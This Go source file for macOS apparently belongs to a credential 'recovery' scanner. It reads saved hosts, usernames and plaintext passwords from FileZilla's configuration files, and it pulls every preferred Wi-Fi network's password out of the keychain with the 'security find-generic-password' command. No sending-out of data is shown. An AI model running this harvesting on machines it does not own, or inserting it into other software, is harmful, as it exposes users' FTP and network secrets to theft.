//go:build darwin

package scanner

import (
	"encoding/xml"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"recovery/recovery/types"
)

func ScanApps() []types.AppCredentialResult {
	var results []types.AppCredentialResult
	results = append(results, scanFileZilla()...)
	results = append(results, scanWiFi()...)
	return results
}

type fzServer struct {
	XMLName  xml.Name `xml:"Server"`
	Host     string   `xml:"Host"`
	Port     int      `xml:"Port"`
	Protocol int      `xml:"Protocol"`
	User     string   `xml:"User"`
	Pass     string   `xml:"Pass"`
}

type fzSiteManager struct {
	XMLName xml.Name   `xml:"FileZilla3"`
	Servers []fzServer `xml:"Servers>Server"`
}

type fzRecentServers struct {
	XMLName xml.Name   `xml:"FileZilla3"`
	Servers []fzServer `xml:"RecentServers>Server"`
}

func scanFileZilla() []types.AppCredentialResult {
	var results []types.AppCredentialResult
	home, _ := os.UserHomeDir()
	if home == "" {
		return nil
	}

	fzDir := filepath.Join(home, ".config", "filezilla")
	for _, file := range []string{"sitemanager.xml", "recentservers.xml"} {
		path := filepath.Join(fzDir, file)
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}

		var servers []fzServer
		if file == "sitemanager.xml" {
			var sm fzSiteManager
			if xml.Unmarshal(data, &sm) == nil {
				servers = sm.Servers
			}
		} else {
			var rs fzRecentServers
			if xml.Unmarshal(data, &rs) == nil {
				servers = rs.Servers
			}
		}

		for _, s := range servers {
			if s.Host == "" {
				continue
			}
			port := s.Port
			if port == 0 {
				port = 21
			}
			protocol := "ftp"
			switch s.Protocol {
			case 1:
				protocol = "sftp"
			case 3, 4:
				protocol = "ftps"
			}
			results = append(results, types.AppCredentialResult{
				Application: "FileZilla",
				Host:        s.Host,
				Port:        port,
				Username:    s.User,
				Password:    s.Pass,
				Protocol:    protocol,
			})
		}
	}

	return results
}

func scanWiFi() []types.AppCredentialResult {
	out, err := exec.Command("/usr/sbin/networksetup", "-listpreferredwirelessnetworks", "en0").Output()
	if err != nil {
		return nil
	}

	var results []types.AppCredentialResult
	for _, line := range strings.Split(string(out), "\n") {
		name := strings.TrimSpace(line)
		if name == "" || strings.HasPrefix(name, "Preferred networks") {
			continue
		}
		pw, err := exec.Command("security", "find-generic-password", "-wa", name, "-D", "AirPort network password").Output()
		password := ""
		if err == nil {
			password = strings.TrimSpace(string(pw))
		}
		results = append(results, types.AppCredentialResult{
			Application: "WiFi",
			Host:        name,
			Password:    password,
			Protocol:    "wifi",
		})
	}
	return results
}